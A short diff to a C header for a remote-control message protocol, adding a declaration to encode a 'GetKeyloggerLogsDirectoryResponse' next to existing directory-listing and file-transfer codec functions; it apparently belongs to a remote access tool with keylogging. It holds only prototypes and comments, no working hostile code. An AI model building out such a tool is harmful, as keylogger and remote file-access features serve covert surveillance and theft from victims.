@@ -74,6 +74,9 @@ int remote_proto_decode_get_directory(const unsigned char* body, unsigned int bo
 /* Encode GetDirectoryResponse body: RemotePath + repeated FileSystemEntry (EntryType, Name, Size). Returns body length or 0. */
 unsigned int remote_proto_encode_get_directory_response(const char* remote_path, unsigned char* out, unsigned int out_size);
 
+/* Encode GetKeyloggerLogsDirectoryResponse body: field 1 LogsDirectory (string). Returns body length or 0. */
+unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size);
+
 /* Parse FileTransferRequest body: field 1 Id (varint), field 2 RemotePath (string). Returns 1 on success. */
 int remote_proto_decode_file_transfer_request(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size);
 
